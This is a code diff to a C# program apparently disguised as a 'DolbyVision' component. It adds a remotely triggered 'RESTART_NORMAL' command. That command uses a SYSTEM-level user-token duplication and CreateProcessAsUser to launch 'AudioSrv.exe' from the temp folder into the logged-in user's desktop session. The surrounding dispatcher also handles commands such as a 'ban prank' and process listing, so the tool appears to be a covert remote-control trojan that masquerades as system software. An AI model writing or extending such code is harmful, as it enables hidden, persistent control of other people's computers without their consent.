@@ -310,6 +310,10 @@ namespace DolbyVision
                 {
                     return StartBanPrank();
                 }
+                if (cmd.Equals("RESTART_NORMAL", StringComparison.OrdinalIgnoreCase))
+                {
+                    return RestartNormalMode();
+                }
                 if (cmd.Equals("PROCESS_LIST", StringComparison.OrdinalIgnoreCase))
                 {
                     return GetProcessList();
@@ -488,6 +492,74 @@ namespace DolbyVision
         private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool CloseHandle(IntPtr hObject);
+
+        // ========== CreateProcessAsUser (从SYSTEM服务启动用户会话进程) ==========
+        [DllImport("kernel32.dll")]
+        private static extern uint WTSGetActiveConsoleSessionId();
+        [DllImport("wtsapi32.dll", SetLastError = true)]
+        private static extern bool WTSQueryUserToken(uint SessionId, out IntPtr phToken);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+        [DllImport("userenv.dll", SetLastError = true)]
+        private static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
+        [DllImport("userenv.dll", SetLastError = true)]
+        private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        private struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public int dwX, dwY, dwXSize, dwYSize;
+            public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
+            public short wShowWindow, cbReserved2;
+            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        private struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess, hThread;
+            public uint dwProcessId, dwThreadId;
+        }
+
+        private static string RestartNormalMode()
+        {
+            IntPtr token = IntPtr.Zero, dupToken = IntPtr.Zero, envBlock = IntPtr.Zero;
+            try
+            {
+                uint sessionId = WTSGetActiveConsoleSessionId();
+                if (sessionId == 0xFFFFFFFF) return "ERROR: 无活动用户会话";
+                if (!WTSQueryUserToken(sessionId, out token))
+                    return "ERROR: WTSQueryUserToken失败 " + Marshal.GetLastWin32Error();
+                if (!DuplicateTokenEx(token, 0x2000000, IntPtr.Zero, 2, 1, out dupToken))
+                    return "ERROR: DuplicateTokenEx失败 " + Marshal.GetLastWin32Error();
+                if (!CreateEnvironmentBlock(out envBlock, dupToken, false))
+                    return "ERROR: CreateEnvironmentBlock失败 " + Marshal.GetLastWin32Error();
+                string exePath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
+                if (!File.Exists(exePath)) exePath = Application.ExecutablePath;
+                var si = new STARTUPINFO();
+                si.cb = Marshal.SizeOf(si);
+                si.lpDesktop = "winsta0\\default";
+                var pi = new PROCESS_INFORMATION();
+                bool ok = CreateProcessAsUser(dupToken, null, exePath, IntPtr.Zero, IntPtr.Zero, false, 0x400, envBlock, Path.GetTempPath(), ref si, out pi);
+                if (!ok) return "ERROR: CreateProcessAsUser失败 " + Marshal.GetLastWin32Error();
+                return "OK: 普通模式已重启 PID=" + pi.dwProcessId;
+            }
+            catch (Exception ex)
+            {
+                return "ERROR: " + ex.Message;
+            }
+            finally
+            {
+                if (envBlock != IntPtr.Zero) DestroyEnvironmentBlock(envBlock);
+                if (dupToken != IntPtr.Zero) CloseHandle(dupToken);
+                if (token != IntPtr.Zero) CloseHandle(token);
+            }
+        }
 
         private static string GetProcessOwner(int pid)
         {
